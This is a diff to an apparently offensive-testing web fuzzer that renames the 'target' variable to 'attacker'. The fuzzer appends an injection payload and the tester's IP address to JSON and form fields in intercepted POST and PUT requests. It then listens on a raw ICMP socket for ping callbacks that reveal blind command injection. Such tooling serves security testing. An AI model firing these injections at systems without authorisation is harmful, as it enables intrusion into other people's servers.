@@ -31,7 +31,7 @@ skip_content = [{"dont_want_to_test": "true"}]   #Content to skip if matches BOD
 skip_keyword = "password"    #a keyword to skip fuzzing if BODY contains that keyword. useful for login/passwords,etc
 delay = .1           #set delay in seconds between replays (ie: .1 is 1/10 of a second between each new injection attempt)
 method_type = ["POST","PUT"]      #Set what HTTP methods are triggered (ie:  "POST", "PUT", etc..)
-target = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])    #function to get IP address but not 127.0.0.1.  Alternatively, mannually set target = "192.168.1.1"
+attacker = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])    #function to get IP address but not 127.0.0.1.  Alternatively, mannually set attacker = "192.168.1.1"
 serial_int = 1   #starting serial number for tracking
 #END CONFIGURATION SECTION
 ##############################################
@@ -121,7 +121,7 @@ def modify_json(webapp_content,flow):
         if isinstance (value, (str)):
           serial_hex = serialize(serial_int)
           value_new = str(value)
-          value_new += payload + serial_hex + " " + target
+          value_new += payload + serial_hex + " " + attacker
           serial_int += 1
           webapp_content_json[(attribute)] = value_new
           send_modified_dict_request(webapp_content_json,flow)
@@ -144,7 +144,7 @@ def modify_string(webapp_content,flow):
         serial_hex = serialize(serial_int)
         att_val_split = re.split('=',att_val)
         value_new = str(att_val_split[1])
-        value_new += payload + serial_hex + " " + target
+        value_new += payload + serial_hex + " " + attacker
         serial_int += 1
         att_val_new = str(att_val_split[0])
         att_val_new += "="
@@ -235,7 +235,7 @@ def check_content(webapp_content,payload,skip_keyword):
 #Workaround for now - run python icmp.py separately
 #import binascii		#For sniffing and serialization
 sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-sock.bind((target, 0))
+sock.bind((attacker, 0))
 try:
     while True:
         #Looking for icmp similiar to result of ping -s 15 -c 1 -p 020000000000000000000000000001 192.168.86.37 (size 15)
